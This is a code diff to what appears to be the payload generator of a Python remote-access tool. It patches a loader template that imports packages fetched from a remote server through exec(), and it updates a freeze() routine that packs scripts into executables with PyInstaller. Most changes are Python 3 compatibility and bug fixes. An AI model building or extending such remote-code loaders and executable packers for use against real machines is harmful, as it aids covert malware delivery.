@@ -5,6 +5,7 @@
 # standard library
 import os
 import sys
+import time
 import zlib
 import base64
 import string
@@ -26,8 +27,9 @@ template_load = string.Template("""
 # remotely import dependencies from server
 
 packages = ${PACKAGES}
+packages_tmp = ${PACKAGES}
 
-for package in packages:
+for package in packages_tmp:
     try:
         exec("import %s" % package, globals())
         packages.remove(package)
@@ -169,7 +171,7 @@ def main(function, *args, **kwargs):
 
     """
     global template_main
-    options = ', '.join(args) + str(', '.join(str("{}={}".format(k, v) if bool(v.count('{') > 0 and v.count('{') > 0) else "{}='{}'".format(k,v)) for k,v in kwargs.items()) if len(kwargs) else '')
+    options = ', '.join(args) + str(', '.join(str("{}={}".format(k, v) if bool(v.count('{') > 0 and v.count('}') > 0) else "{}='{}'".format(k,v)) for k,v in kwargs.items() if v != None) if len(kwargs) else '')
     return template_main.substitute(VARIABLE=function.lower(), FUNCTION=function, OPTIONS=options)
 
 def loader(host='127.0.0.1', port=1337, packages=[]):
@@ -205,14 +207,28 @@ def freeze(filename, icon=None, hidden=None):
     basename = os.path.basename(filename)
     name = os.path.splitext(basename)[0]
     path = os.path.splitdrive(os.path.abspath('.'))[1].replace('\\','/')
-    key = str().join([random.choice([chr(i) for i in range(48,91) + range(97,123)]) for _ in range(16)])
-    imports = [i.strip().split()[1].split(';')[0].split(',') for i in open(filename).read().splitlines() if len(i.strip().split()) if i.strip().split()[0] == 'import']
-    for _ in imports:
-        if isinstance(_, list):
-            __ = imports.pop(imports.index(_))
+    key = ''.join([random.choice([chr(i) for i in list(range(48,91)) + list(range(97,123))]) for _ in range(16)])
+
+    imports = []
+    with open(filename) as import_file:
+        for potental_import in filter(None, (PI.strip().split() for PI in import_file)):
+            if potental_import[0] == 'import':
+                imports.append(potental_import[1].split(';')[0].split(','))
+
+    bad_imports = set()
+    bad_imports.add('core')
+    for i in os.listdir('core'):
+        i = os.path.splitext(i)[0]
+        bad_imports.add(i)
+        bad_imports.add('core.%s' % i)
+
+    for imported in imports:
+        if isinstance(imported, list):
+            __ = imports.pop(imports.index(imported))
             for ___ in __:
-                if ___ not in ['core'] + [os.path.splitext(i)[0] for i in os.listdir('core')] + ['core.%s' % s for s in [os.path.splitext(i)[0] for i in os.listdir('core')]]:
+                if ___ not in bad_imports:
                     imports.append(___)
+
     imports = list(set(imports))
     if isinstance(hidden, list):
         imports.extend(hidden)
@@ -224,9 +240,14 @@ def freeze(filename, icon=None, hidden=None):
     while True:
         try:
             line = process.stderr.readline().rstrip()
-        except: break
-        if line: util.display(line, color='reset', style='dim')
-        if 'EXE' in line and 'complete' in line: break
+        except: 
+            break
+        if line.strip() != None:
+            util.display(line, color='reset', style='dim')
+            line = line.decode('utf-8')
+            if 'EXE' in line and 'complete' in line:
+                break
+        time.sleep(0.25)
     output = os.path.join(path, 'dist', name + str('.exe' if os.name == 'nt' else ''))
     return output
 
